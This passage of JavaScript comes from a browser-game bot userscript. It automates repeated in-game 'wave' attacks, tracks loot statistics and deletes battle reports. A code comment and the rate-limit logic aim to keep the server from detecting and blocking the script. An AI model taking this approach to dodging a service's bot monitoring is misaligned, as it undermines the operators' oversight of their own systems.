		if ( !Data.options.waves.maximum || 
			 Data.options.waves.maximum === 0 || 
			 Data.options.waves.maximum > Seed.cities[0].figures.marches.maximum
			) {
			Data.options.waves.maximum = Seed.cities[0].figures.marches.maximum;
		}

		if ( !Data.stats.waves.start_at ) {
			Data.stats.waves.start_at = serverTime();
		}
		
		Messages.addBattleReportListener(t.gotBattleReport);

		t.timer.marches = setTimeout ( t.marchesTick, 1000 );

		//if ( Data.options.waves.target.type != '' && !(/(City|Outpost)/.test(Data.options.waves.target.type)) ) {
			t.setWaveEnable (Data.options.waves.enabled);
		//} else {
		//	t.setWaveEnable (false);
		//}
		
		window.addEventListener('unload', t.onUnload, false);
	},
	
	show : function ()
	{
		var t = Tabs.Waves;

		t.showSubTab ( {data:{ current_tab: Data.options.waves.current_tab }} );
	},
	
	hide : function ()
	{
		var t = Tabs.Waves;
		clearTimeout ( t.timer.tick );t.timer.tick=null;
	},
	
	onUnload : function ()
	{
		var t = Tabs.Waves;
		if ( Data.options.waves.enabled ){
			Data.stats.waves.run_time += ( serverTime() - t.running.start_at );
		}
	},
	
	showSubTab : function( event )
	{
		var t = Tabs.Waves;
		
		var current_tab = event.data.current_tab;
		
		clearTimeout ( t.timer.tick );t.timer.tick=null;

		Data.options.waves.current_tab = current_tab;

		var tab_name;
		switch ( current_tab )
		{
		case 0: tab_name = 'tabTargets'; break;
		case 1: tab_name = 'tabStats'  ; break;
		case 2: tab_name = 'tabOptions'; break;
		}
		
		$J('#'+UID[t.last_tab_id])
		.css('z-index', '0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Waves.' + tab_name])
		.css('z-index', '1')
		.addClass('selected');
		
		t.last_tab_id = 'Tabs.Waves.' + tab_name;
		
		t[tab_name] ();
	},
	
	tabTargets : function ()
	{
		var t = Tabs.Waves;
		
		var html = 
		 '<div id=' + setUID('Tabs.Waves.tabTargets.title') +' class="' + UID['title'] + '">' + translate('Wave') + '&nbsp;' + translate('Targets') + '</div>';
		 
		html += 
		 '	<div>'
		+'		<center>'
		+'		<h4>'+ translate('Enter Coords') +':&nbsp;</h4><br>'
		+'		<h4>X:</h4> <input id=' + setUID('Tabs.Waves.tabTargets.coord_x') + ' size=3 maxlength=3 type=text value="' + Data.options.waves.target.x + '" /> '
		+'		<h4>Y:</h4> <input id=' + setUID('Tabs.Waves.tabTargets.coord_y') + ' size=3 maxlength=3 type=text value="' + Data.options.waves.target.y + '" /> '
		+'		&nbsp <h4>'+ translate('Distance') + ':</h4> <span id=' + setUID('Tabs.Waves.tabTargets.distance') + '></span>'
		+'		&nbsp(<span id=' + setUID('Tabs.Waves.tabTargets.time') + '></span>)'
		+'		<BR>'
		+'		<div class=' + UID['status_ticker'] + ' style="height:auto !important;margin:5px 10px !important;">'
		+'			<center><span id=' + setUID('Tabs.Waves.tabTargets.target') + '></span></center>'
		+'		</div>'
		+'		</center>'
		+'	</div>'
		+'  <div>'
		+'  <center>'
		+'	<table id=' + setUID('Tabs.Waves.tabTargets.units') + ' class=' + UID['table'] + '>'
		+'		<tr>'
		+'			<th colspan=10><h4>' + translate('Troops for Wave Attack') + '</h4></th>'
		+'		</tr>'
		+'	</table>'
		+'  </center>'
		+'	</div>'
		+'	<br>'
		+'  <div>'
		+'  <center>'
		+'	<table id=' + setUID('Tabs.Waves.tabTargets.dragons') + ' class=' + UID['table'] + '>'
		+'		<tr>'
		+'			<th colspan=10><h4>' + translate('Send') + ' ' + translate('Dragon') + ' ' + translate('Available') + '</h4></th>'
		+'		</tr>'
		+'	</table>'
		+'  </center>'
		+'	</div>';
		
		t.$content.html ( html );
		
		
		function setUnitsTable ( table , idx ) {
			var t = Tabs.Waves;
			var lableRow;
			var inputRow;
			var val, c=0;

			for (var i=0; i < t.units_type.length; i++)
			{
				var unit_type=t.units_type[i];
				/*
				if (Units.getUnitNumbers(Seed.cities[0], t.units_type[i]).total < 1) {
					continue;
				}
				*/
				if (i%9 === 0) {
					labelRow = table.insertRow(-1);
					inputRow = table.insertRow(-1);
					c = 0;
				}
				var label = labelRow.insertCell(c);
				//label.innerHTML = translate('~'+t.units_type[i]);
				label.innerHTML = '<span class="' + UID['doa-icons'] + ' i-' + t.units_type[i] + '" style="margin-left:10px"></span>';
				label.style.width  = '45px';
				label.style.height = '20px';
				label.title = translate( unit_type );
				
				var input = document.createElement ('input');
				input.type = 'text';
				input.size = '1';
				input.style.width = '40px';
				input.title = translate(unit_type);
				
				if (i < 2) {
					input.style.border = '1px solid black';
				} else if (i < 9) {
					input.style.border = '1px solid green';
				} else {
					input.style.border = '1px solid blue';
				}
				
				input.maxlength = '6'; // Allow 100,000 units to be sent
				
				
				if (Data.options.waves.wave[idx].units[unit_type] === undefined){
					Data.options.waves.wave[idx].units[unit_type] = 0;
				}
				val = Data.options.waves.wave[idx].units[unit_type];
				
				if (!val){ val = 0;	}
				
				input.value = val;
				input.setAttribute( 'ref', idx+'_'+t.units_type[i] );
				
				$J(input).change ( function ( event, ui ){
					var ref = $J(this).attr('ref');
					var args = ref.split('_');
					var wave_idx = parseInt(args[0]);
					var unit_type = args[1];
					Data.options.waves.wave[wave_idx].units[unit_type] = event.target.value;
					
					var time = Marches.getMarchTime (Data.options.waves.target.x,Data.options.waves.target.y, Data.options.waves.wave[wave_idx].units);
					$J('#'+UID['Tabs.Waves.tabTargets.time']).html( timeFormatShort(time) );
				} );
				
				inputRow.insertCell(c).appendChild (input);
				
				c = c + 1;
				
			}
		}
		
	
		function setDragonsTable ( table, idx ) {
			var t = Tabs.Waves;
			var row;

			var dragons = Data.options.waves.wave[idx].dragons;
			
			for (var dragon_idx = 0; dragon_idx < Dragons.DRAGONS_NAMES.length; dragon_idx++)
			{
				
				var dragon_type = Dragons.DRAGONS_NAMES[dragon_idx];
				
				if ( dragon_type == '' || dragon_type == 'SpectralDragon' || !Dragons.all_dragons[ dragon_type ] ) continue;
				if ( dragon_type == '' || dragon_type == 'ForestDragon' || !Dragons.all_dragons[ dragon_type ] ) continue;
				
				if ( dragon_idx%10 === 0 ) {
					row = table.insertRow(-1);
				}
				
				var cell = row.insertCell( -1 );
				cell.style.verticalAlign = 'middle';
				cell.style.paddingRight = '5px';
				
				if (dragons[dragon_type] === undefined){
					dragons[dragon_type] = 0;
				}

				var num=dragons[dragon_type];
				
				$J('<span />').
				attr({
					class : UID['doa-icons'] + ' i-' + dragon_type,
					title : translate(dragon_type).replace(/\./,'')
				}).
				css( {
					display		: 'inline-block',
					position	: 'relative !important',
					marginTop	: '3px',
					marginRight	: '2px'
				} ).
				appendTo(cell);
				
				var $input = $J('<input type=checkbox />').
				attr ( {
					name	: dragon_type,
					title	: translate(dragon_type),
					ref : idx + '_' + dragon_type,
					checked : num !== 0
				} ).
				css  ( {
					fontSize	: '11px',
					textAlign	: 'center'
				}).
				change ( function(event){
					var t = Tabs.Waves;
					var ref = $J(this).attr('ref');
					var args = ref.split('_');
					var wave_idx = parseInt(args[0]);
					var dragon_type = args[1];
					Data.options.waves.wave[wave_idx].dragons[dragon_type] = ($J(this).is(':checked') ? 1 : 0);
				}).
				appendTo(cell);
						
			}
		}
	
		// Event Listeners
		$J('#'+UID['Tabs.Waves.tabTargets.coord_x']).change( t.onChangeCoords );
		$J('#'+UID['Tabs.Waves.tabTargets.coord_y']).change( t.onChangeCoords );
		
		// Add Units table
		setUnitsTable ( $id(UID['Tabs.Waves.tabTargets.units']),0 );

		// Add Dragon table
		setDragonsTable ( $id(UID['Tabs.Waves.tabTargets.dragons']),0 );
		
		t.onChangeCoords();
		
	},
		
	// called when battle report received
	trackStats : function (march_id, r)
	{
		var t = Tabs.Waves;
		if ( DEBUG_MARCHES ) {
			debugLog ('Tabs.Waves.trackStats: '+ march_id);
		}
		
		//for (var i=0; i < r.report.spoils.items.length; i++){
		//	if ( !Data.stats.waves.spoils[r.report.spoils.items[i]] ) {
		//		Data.stats.waves.spoils[r.report.spoils.items[i]] = 1;
		//	} else {
		//		++Data.stats.waves.spoils[r.report.spoils.items[i]];
		//	}
		//}
				
		++Data.stats.waves.total;
		
		var resources =  r.report.spoils.resources;
		for (var type in resources)
		{
			objAddTo ( Data.stats.waves.items.resources, type, parseInt(resources[type]) );
		}  
		
		// add the talismans to the Arsenal gathered.
		// Wham 1120a - these should now go into spoils items
		var kill_items =  r.report.spoils.kill_items;
		for (var type in kill_items)
		{
			objAddTo ( Data.stats.waves.items.arsenal, type, parseInt(kill_items[type]) );
		}
		
		// Wham 1120a
		// Add items to the stats categories
		var items_res = r.report.spoils.items;
		for (var i=0; i < items_res.length; i++)
		{
			var item = items_res[i];
			if ( /(Stack|TroopPrizeItem)/.test(item) ) {
				var quantity = item.replace(/\D/g,'');
				quantity = parseInt( quantity );
				quantity = (isNaN(quantity)) ? 1 : quantity;
				var name = item.replace(/\d/g,'').replace('Stack','').replace('TroopPrizeItem','');
			} else {
				var quantity = parseInt( item );
				quantity = (isNaN(quantity)) ? 1 : quantity;
				var name = item;
			}
			
			if ( /(Blink|Hop|Skip|Jump|Leap|Bounce|Bore|Bolt|Blast)/.test(name) )  {
				objAddTo (Data.stats.waves.items.speedups, name, quantity);
			} 
			else if ( /(AquaTroopRespirator|StoneTroopItem|FireTroopItem|WindTroopItem|IceTroopItem|SwampTroopItem|FrostGiantItem|ForestTroopItem|DarkSlayerItem|Curse|DragonEgg)/.test(name) ) {
				objAddTo (Data.stats.waves.items.arsenal, name, quantity);
			} 
			else if ( /(Helmet|Head|ClawGuards|Talons|BodyArmor|Body|TailGuard|Tail|GreenArmor|RedArmor|GoldArmor|BlackArmor|PinkArmor|BlueArmor|SilverArmor)/.test(name) ) {
				objAddTo (Data.stats.waves.items.armors, name, quantity); 
			}
			else if ( /(TroopPrizeItem)/.test(item) ) {
				objAddTo (Data.stats.waves.items.trooops, name, quantity); 
			}
			else if ( /(Ticket|Momentary)/.test(name) ) {
				objAddTo (Data.stats.waves.items.others, name, quantity); 
			}
			else {
				objAddTo (Data.stats.waves.items.general, name, quantity); 
			}
		}
		
		//t.showStats();
	},

	tabStats : function ()
	{
		var t = Tabs.Waves;
		
		var html = 
		 '<div class="' + UID['title'] + '">' + translate('Wave') + '&nbsp;' + translate('Statistics') + '</div>';
		 
		html +=
		 '<div id=' + setUID('Tabs.Waves.tabStats.content') + ' class=' + UID['content'] +'></div>' // class=' + UID['content'] +  //  style="height:380px; max-height:380px; overflow-y:auto"
		+'<center>'
		+'	<input id=' + setUID('Tabs.Waves.tabStats.clearStats') + ' type=button value="' + translate('Delete') + ' ' + translate('Statistics') + '" />'
		+'</center>';

		//var html = 
		// '<div id=' + setUID('Tabs.Waves.tabStats.title') +' class="' + UID['title'] + '">' + translate('Wave') + '&nbsp;' + translate('Statistics') + '</div>';
		//+'	<div id='+ setUID('Tabs.Waves.tabStats.content') + ' class=' + UID['content'] + '></div>'
		//+'	<center>'
		//+'		<input id=' + setUID('Tabs.Waves.tabStats.clearStats') + ' type=button value="' + translate('Delete') + ' ' + translate('Statistics') +'" />'
		//+'	</center>';
		
		t.$content.html ( html );

		$J('#'+UID['Tabs.Waves.tabStats.content']).css({
			height : $J('#'+UID['Tabs.Waves.content']).innerHeight()-55 + 'px',
			marginBottom : '4px'
		});

		function showStats ()
		{

			var run_time = Data.stats.waves.run_time;
			if ( Data.options.waves.enabled ) {
				run_time += ( serverTime() - t.running.start_at );
			}
			
			var run_time_fixed = (run_time > 0) ? (run_time/3600) : 1;
			
			// Wham 1119c - add scrollable table
			var html = 
			 '<table class=' + UID['table'] + '>'
			+'	<tr>'
			+'		<th style="width:155px">' + translate('Start Date') + '</th>'
			+'		<th style="width:155px">' + translate('Run Time') + '</th>'
			+'		<th style="width:155px">' + translate('Attacks') + '</th>'
			+'  </tr>'
			+'  <tr style="border-bottom: 1px solid gray">'
			+'		<td style="text-align:center"><b>' + new Date(Data.stats.waves.start_at * 1000).myString() + '</b></td>'
			+'		<td style="text-align:center"><b>' + timeFormat(run_time, true) + '</b></td>'
			+'		<td style="text-align:center"><b>' + Data.stats.waves.total + '</b></td>'
			+'	</tr>'
			+'</table>'
			+'<table class=' + UID['table'] + '>'
  	  +'  <tr valign=top>'
			+'		<td style="width:50px">' + translate('Armor') + ': </td>'
			+'		<td>' // style="width:415px"
			//+'      <div style="overflow-y:auto;width:410px">'
			+'			<table class="' + UID['table'] + ' zebra">';
			
			// Dragon Armor
			for (var name in Data.stats.waves.items.armors)
			{
				var per_hour = Data.stats.waves.items.armors[name] / run_time_fixed;
				html += 
				    '	  <tr align=right>'
				   +'			<td style="width:155px">' 
				   +'				<span>' + translate(name) + '</span>'
				   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
				   +'			</td>'
				   +'			<td style="width:100px">' + Data.stats.waves.items.armors[name].intToCommas() + '</td>'
				   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
				   +'		</tr>';
			}
			html +=
			 '		  </table>'
			//+'    </div>'
			+'		</td>'
			+'  </tr>'
			+'  <tr valign=top>'
			+'    <td style="width:50px">' + translate('Items') +': </td>'
			+'    <td>'
			+'      <table class="' +UID['table'] + ' zebra">';
			
			// Tickets, Truce 
			for (var name in Data.stats.waves.items.others)
			{
				var per_hour = Data.stats.waves.items.others[name] / run_time_fixed;
				html += 
				    '	  <tr align=right>'
				   +'			<td style="width:155px">' 
				   +'				<span>' + translate(name) + '</span>'
				   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
				   +'			</td>'
				   +'			<td style="width:100px">' + Data.stats.waves.items.others[name].intToCommas() + '</td>'
				   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
				   +'		</tr>';
			}
			
			html +=
			 '		  </table>'
			//+'    </div>'
			+'		</td>'
			+'  </tr>'
			+'  <tr valign=top>'
			+'    <td style="width:50px">' + translate('Speedup') +': </td>'
			+'    <td>'
			+'      <table class="' +UID['table'] + ' zebra">';
			
			// Speedups - hops, skips
			for (var name in Data.stats.waves.items.speedups)
			{
				var per_hour = Data.stats.waves.items.speedups[name] / run_time_fixed;
				html += 
				    '	  <tr align=right>'
				   +'			<td style="width:155px">' 
				   +'				<span>' + translate(name) + '</span>'
				   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
				   +'			</td>'
				   +'			<td style="width:100px">' + Data.stats.waves.items.speedups[name].intToCommas() + '</td>'
				   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
				   +'		</tr>';
			}
			
			html +=
			 '		  </table>'
			+'		</td>'
			+'  </tr>'
			+'  <tr valign=top>'
			+'    <td style="width:50px">' + translate('Arsenal') +': </td>'
			+'    <td>'
			+'      <table class="' +UID['table'] + ' zebra">';
			
			// Arsenal - mandrakes, talons, respirators, talismans, runes
			for (var name in Data.stats.waves.items.arsenal)
			{
				var per_hour = Data.stats.waves.items.arsenal[name] / run_time_fixed;
				html += 
				    '	  <tr align=right>'
				   +'			<td style="width:155px">' 
				   +'				<span>' + translate(name) + '</span>'
				   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
				   +'			</td>'
				   +'			<td style="width:100px">' + Data.stats.waves.items.arsenal[name].intToCommas() + '</td>'
				   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
				   +'		</tr>';
			}
  	
			html +=
			 '		  </table>'
			+'		</td>'
			+'  </tr>'
			+'  <tr valign=top>'
			+'		<td style="width:50px">' + translate('Resources') + ': </td>'
			+'		<td>'
			+'			<table class="' + UID['table'] + ' zebra">';
			
			// Resources - food, ore, stone, wood
			for (var name in Data.stats.waves.items.resources)
			{
				var per_hour = Data.stats.waves.items.resources[name] / run_time_fixed;
				html += 
				 '	<tr align=right>'
				+'			<td style="width:155px">'
				+'				<span>' + translate(name) + '</span>'
				+'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
				+'			</td>'
				+'			<td style="width:100px">' + Data.stats.waves.items.resources[name].intToCommas() + '</td>'
				+'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
				+'		</tr>';
			}
			
			html +=
			 '		</table>'
			+'		</td>'
			+'	</tr>'
			+'  <tr valign=top>'
			+'    <td style="width:50px">' + translate('Troops') +': </td>'
			+'    <td>'
			+'      <table class="' +UID['table'] + ' zebra">';
			
			// Tickets, Truce 
			for (var name in Data.stats.waves.items.trooops)
			{
				var per_hour = Data.stats.waves.items.trooops[name] / run_time_fixed;
				html += 
				    '	  <tr align=right>'
				   +'			<td style="width:155px">' 
				   +'				<span>' + translate(name) + '</span>'
				   +'				<span class="' + UID['doa-icons'] + ' i-' + name + '"></span>'
				   +'			</td>'
				   +'			<td style="width:100px">' + Data.stats.attacks.items.trooops[name].intToCommas() + '</td>'
				   +'			<td style="width:100px">(' + per_hour.intToCommas() + ' /' + translate('h') + ')</td>'
				   +'		</tr>';
			}
			
			html +=
			 '		  </table>'
			+'		</td>'
			+'  </tr>'
			+'</table>';
			
			
			$J('#'+UID['Tabs.Waves.tabStats.content']).html( html );
			
		}
		
		function clearStats (){
			var now = serverTime();

			Data.stats.waves = {
					 start_at		: now
					,run_time		: 0
					,total			: 0 
					,items : {
						 resources : {}
						,speedups  : {}
						,production: {}
						,general   : {}
						,chest     : {}
						,arsenal   : {}
						,armors    : {}
						,others	  : {}
						,trooops   : {}
					}
			}
			
			showStats();
		}
		
		// Event Listeners
		$J('#'+UID['Tabs.Waves.tabStats.clearStats']).click ( clearStats );
		
		showStats();
		if ( Data.options.waves.enabled ) {
			t.timer.tick = setInterval( showStats, 1000 );
		}
	},
		
	tabOptions : function ()
	{
		var t = Tabs.Waves;
		
		var html = 
		 '<div id=' + setUID('Tabs.Waves.tabOptions.title') +' class="' + UID['title'] + '">' + translate('Wave') + '&nbsp;' + translate('Options') + '</div>';
		 
		html +=
		 '	<table class=' + UID['table'] + '>'
		+'	<tr>'
		+'		<td>'+ translate('Maximum requests per hour') +':&nbsp;</td>'
		+'		<td>'
		+			Data.options.marches.requests.max_per_hour
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>' + translate('Delay Between Attacks') + ':&nbsp;</td>'
		+'		<td>'
		+'			<input id=' + setUID('Tabs.Waves.tabOptions.delayMin') + ' type=text size=4 maxlength=4 value="' + Data.options.waves.delay_min + '" />&nbsp;-&nbsp;'
		+'			 <span id=' + setUID('Tabs.Waves.tabOptions.delayMax') + '>' + Data.options.waves.delay_max + '</span>&nbsp;' + translate('Seconds')
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td> ' + translate('Delete') + ' ' + translate('Battle Report') + ':&nbsp;</td>'
		+'		<td><input id=' + setUID('Tabs.Waves.tabOptions.deleteReports') + ' type=checkbox ' + (Data.options.waves.delete_reports?'CHECKED':'') + ' /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>' + translate('Stop if any troops lost') + ':&nbsp;</td>'
		+'		<td><input id=' + setUID('Tabs.Waves.tabOptions.stopOnLoss') + ' type=checkbox ' + (Data.options.waves.stop_on_loss?'CHECKED':'') + ' /></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'+ translate('Maximum simultaneous waves') +':&nbsp;</td>'
		+'		<td><input id='+ setUID('Tabs.Waves.tabOptions.maximum') +' size=2 maxlength=2 type=text value="'+ Data.options.waves.maximum +'" /></td>'
		+'	</tr>'
		+'	</table>';
		
		t.$content.html ( html );
		
		function onChangeDelay (event){
			
		}
		
		// Event Listeners
		$J('#'+UID['Tabs.Waves.tabOptions.deleteReports']).click (function( event ) {
			Data.options.waves.delete_reports = event.target.checked;
		});
		$J('#'+UID['Tabs.Waves.tabOptions.stopOnLoss']).click ( function( event ) {
			Data.options.waves.stop_on_loss = event.target.checked;
		});

		$J('#'+UID['Tabs.Waves.tabOptions.maximum']).change( function( event )
			{
				var maximum = parseIntNan($J(this).val());
				// Max waves is determined by the muster point level (Wham)
				if ( maximum < 1 || maximum > Seed.cities[0].figures.marches.maximum )
				{
					maximum = Seed.cities[0].figures.marches.maximum;
					$J(this).val(maximum);
				}
				Data.options.waves.maximum = maximum;
			} 
		);

		$J('#'+UID['Tabs.Waves.tabOptions.delayMin']).change ( function ( event ) {
			/*
			* WARNING: Changing this values cause Too many requests to the server 
			*          that are monitored. Thats gives them reason to increase the security 
			*          on the servers and, sooner or later, make this scripts unusable.
			*            
			*      PLEASE, BE SMART, DON'T HELP THEM TO SEEK WAYS TO BLOCK THIS SCRIPT
			*
			*                   ( We will end up losing everyone )
			*/
			var min = parseIntZero( event.target.value );
			if (min < 25 || min > 3600){
				min = ( min < 25 ) ? 25 : 3600;
				$J(this).val ( min );
			}
			var max = parseInt ( min + 25 );

			$J('#'+UID['Tabs.Waves.tabOptions.delayMax']).html( max );
			
			Data.options.waves.delay_min = min;
			Data.options.waves.delay_max = max;
		});
	},
		

	
	gotBattleReport : function ( r ){
		var t = Tabs.Waves;
		
		if (r.report.location.x === Data.options.waves.target.x && 
			r.report.location.y === Data.options.waves.target.y){
			
			var march_id = null;
			for (var id in Data.marches.waves ) {
				var march = Data.marches.waves[id];
				
				if (march.x === r.report.location.x && 
					march.y === r.report.location.y &&
					march.general && march.general.id === r.report.attacker.general.id
					){  // TODO: time and units check here
						march_id = id;
						break;
				}
			}
			
			if (march_id) {
				Data.marches.waves[march_id].has_report = true;
				var resources =  r.report.spoils.resources;
				Data.marches.waves[march_id].res = resources;
				t.trackStats(march_id, r);
			}
			
			if (march_id) {
				var march = Data.marches.waves[march_id];
				if (Data.options.waves.stop_on_loss && march && march.origin && march.origin == 'tools') {
					for (var p in r.report.attacker.units) {
						if( !Dragons.DRAGONS_REGEXP.test( p ) ) { // Didi : don't test dragon 
							if (r.report.attacker.units[p][0] !== r.report.attacker.units[p][1]) {
								var ts = new Date(r.report_notification.created_at * 1000).myString();
								t.setWaveEnable (false);
								t.dispFeedback (translate('Troops lost') + '! (' + ts +')');
								actionLog (translate('Wave')+': '+translate('Troops lost')+'! ('+ ts +')');
								return;
							}
						}
					}
				}
				if (Data.options.waves.delete_reports && r.report.attacker.name === Seed.player.name){
					if (march && march.origin && march.origin == 'tools') {
						Messages.deleteMessage(r.report_notification.id);
					}
				}
			}
		}
	},


	dispFeedback : function ( msg ){
		if ( msg && msg !== '') {
			msg = new Date().toTimeString().substring (0,8) +' '+ msg;
		}
		$J('#'+UID['Tabs.Waves.feedback']).html( msg );
	},

	setWaveEnable : function (on_off){
		var t = Tabs.Waves;
		var but = $id(UID['Tabs.Waves.enabled']);
		
		clearTimeout (t.timer.attack);t.timer.attack=null;
		Data.options.waves.enabled = on_off;
		
		if ( on_off ) {
		
			t.dispFeedback(translate('Starting soon') + '...' + translate('Please wait') + '...');
			
			but.value = translate('Attacking').toUpperCase();
			but.className = UID['btn_on'];
			
			t.running.start_at = serverTime();
			t.running.attacks = 1;
			
			// Yes, check here if attacks are enabled
			if (!Data.options.attacks.enabled){
				Data.options.marches.requests.counter = 1;
				Data.options.marches.requests.start_at = serverTime();
			}
			
			t.attackTick();
		} 
		else {
			but.value = translate('Disabled').toUpperCase();
			but.className = UID['btn_off'];
			clearTimeout ( t.timer.tick );t.timer.tick=null;
			
			if ( t.running.start_at !== 0 ){
				Data.stats.waves.run_time += ( serverTime() - t.running.start_at );
			}
		}
	},


	attackTick : function (){
		var t = Tabs.Waves;
		var now = serverTime();
		var target_msg='', retry_delay, available_general, marching = 0, total_marches=0;

		
		clearTimeout (t.timer.attack);t.timer.attack=null;
		
		// Don't do anything if wave attacks are not enabled
		if (!Data.options.waves.enabled){
			return;
		}    
		
		
		var min_time = 700000;
		var max_time = 0;
		for (id in Seed.marches){
			++total_marches;
			if (Seed.marches[id].status === 'marching'){
				++marching;
			}
			// Fixed by Jawz74
			var left_time = ( Seed.marches[id].run_at - parseInt(serverTime()) ) + (Seed.marches[id].status=='marching' ? Seed.marches[id].duration : 0);
			
			//fixed by Didi
			if (left_time > 0) {
				min_time = min_time < left_time ? min_time : left_time;
				max_time = max_time > left_time ? max_time : left_time;
			}
		}
		
		//fixed by Didi
		if ( min_time === 700000 || max_time === 0 ) {
			min_time = 3;
		}
		
		retry_delay = (min_time * 1000) + Math.randRange(2000,5000);

		
		target_msg =  'a level ' + Data.options.waves.target.level + ' ' + Data.options.waves.target.type + ' at ' + Data.options.waves.target.x +'/'+ Data.options.waves.target.y;
		
		

		if ( Marches.total.waves >= Data.options.waves.maximum )
		{
			verboseLog('<b>Wave<b> attack to ' + target_msg + ' delayed due to <b>march limit</b> reached: retry in ' + timeFormat(retry_delay/1000));

			t.dispFeedback(translate('March limit reached') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
			t.timer.attack = setTimeout(t.attackTick, retry_delay);
			return;
		}
		
		if ( Seed.cities[0].figures.marches.maximum - Seed.total.marches <= 0 ) {
			verboseLog('<b>Wave</b> attack to ' + target_msg + ' delayed due to <b>insufficent march slots</b>: retry in ' + timeFormat(retry_delay/1000));
			t.dispFeedback(translate('Muster Point') +' '+ translate('Full') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
			t.timer.attack = setTimeout(t.attackTick, retry_delay);
			return;
		}
		
		available_general = getAvailableGeneral( Data.options.waves.target.level === 1 );
		
		if (available_general === null) {
			verboseLog('<b>Wave</b> attack to ' + target_msg + ' delayed due to <b>insufficent generals</b>: retry in ' + timeFormat(retry_delay/1000));
			t.dispFeedback(translate('Generals') + ' ' + translate('Unavailable') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
			t.timer.attack = setTimeout(t.attackTick, retry_delay);
			return;
		}

		var units = Data.options.waves.wave[0].units.cloneProps(); // Object.clone( Data.options.waves.units );
		var units_dragons = Data.options.waves.wave[0].dragons.cloneProps();
		units.mergeWith(units_dragons);

		// Check Dragon Wave
		if ( !Dragons.chooseOneDragon(units) )
		{
			t.dispFeedback(translate('Dragon') + ' ' + translate('Selected') + ' '+ translate('Unavailable') + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
			t.timer.attack = setTimeout(t.attackTick, retry_delay);
			return;
		}
		
		var check_units = Units.checkAvailableUnits(0, units);
		if (check_units !== null) {
			verboseLog('<b>Wave</b> attack to ' + target_msg + ' delayed due to <b>' + check_units +' units</b>: retry in ' + timeFormat(retry_delay/1000));
			t.dispFeedback(check_units + ': ' + translate('Retry in') + ' ' + timeFormat(retry_delay/1000));
			t.timer.attack = setTimeout(t.attackTick, retry_delay);
			return;
		}		
		
		// All prerequisite checks are done so march request can be sent
		verboseLog('Wave attack to ' + target_msg + ' Attempted');		
		
		target_msg = '#.'+ t.running.attacks + ' ' + target_msg;
		// Add Units to target_msg
		target_msg += '<br>' + translate('Sending') + ': ';
		var unitsMsg = [];
		for (var name in units){
			if(units[name] > 0){
				unitsMsg.push(translate(name) + '(' + units[name] + ')');
			}
		}
		target_msg += unitsMsg.join(' + ');
		
		new MyAjax.marches ({
			city_id    : Seed.cities[0].id,
			x          : Data.options.waves.target.x,
			y          : Data.options.waves.target.y,
			general_id : available_general.id,
			units      : units,
			owner_id   : 'waves',
			delay      : 3000,
			
			onSuccess  : function ( r ) {
				var t = Tabs.Waves, delay;
				
				Marches.add(r.job.march_id, 'waves');
					
				Data.options.marches.requests.counter++;
				
				t.running.attacks++;
			
				t.running.errors = 0;
				
				var delay_min = Data.options.waves.delay_min;
				var delay_max = Data.options.waves.delay_max;
				delay = Math.randRange(delay_min*1000, delay_max*1000);

				if ( Data.options.marches.requests.counter >= Data.options.marches.requests.max_per_hour )
				{
					if ( parseInt(serverTime() - Data.options.marches.requests.start_at) < 3600 ) {
						delay = parseInt( (3600 - (serverTime() - Data.options.marches.requests.start_at)) * 1000 );
						setTimeout(function(){t.dispFeedback(translate('Attacks stopped momentarily to prevent server blocking') + ' - ' + translate('waiting') + ': ' + timeFormat(delay/1000))}, Data.options.waves.delay_min*500 );
					} else {
						Data.options.marches.requests.start_at = serverTime();
						Data.options.marches.requests.counter = 1;
					}
				}
				else if ((Data.options.marches.requests.counter % 15) === 0)
				{
					var time_offset = parseInt(serverTime() - Data.options.marches.requests.start_at);
					if ( time_offset < 3600 )
					{
						if ( (time_offset / Data.options.marches.requests.counter) < (3600 / Data.options.marches.requests.max_per_hour) )
						{
							/* Attacks are being sent at a rate that will exceed the maximum per hour slow down. */
							delay = 45 * total_marches * 1000;
							setTimeout(function(){t.dispFeedback(translate('Attacks stopped momentarily to prevent server blocking') + ' - ' + translate('waiting') + ': ' + timeFormat(delay/1000))}, delay_min*500 );
						}
					}
				}
				else {
					delay = Math.randRange(delay_min*1000, delay_max*1000);
					
					verboseLog('Wave attack to: ' + target_msg + ' Successfully');
				
					actionLog(translate('Wave attack to') + ': ' + target_msg);
					
					t.dispFeedback (translate('Wave attack to')+ ': ' + target_msg);
				}

				t.timer.attack = setTimeout (t.attackTick, delay);
				
				// Erase feedback message
				setTimeout( function(){ t.dispFeedback(''); },  parseInt( delay/2 ) );
			},
			
			onFailure   : function ( r ) {
				var t = Tabs.Waves, delay;

				++t.running.errors;
				delay = 60000 * (t.running.errors * t.running.errors);
				
				verboseLog('<b>Wave<b> attack to: ' + target_msg + ' <b>failed</b> and returned error' + ': ' + r.errmsg + ' - retrying in ' + timeFormat(delay/1000));
				
				actionLog(translate('Wave attack to')+ ' ' + target_msg + ' ' + translate('failed'));

				t.dispFeedback(translate('Wave attack to')+ ' ' + target_msg + ' failed');
				
				if (r.status && r.status === 509){
					/*
					if ( Data.options.marches.requests.counter > 30 ) {
						Data.options.marches.requests.max_per_hour = Data.options.marches.requests.counter;
					}
					*/
					delay = ERROR_509_DELAY;
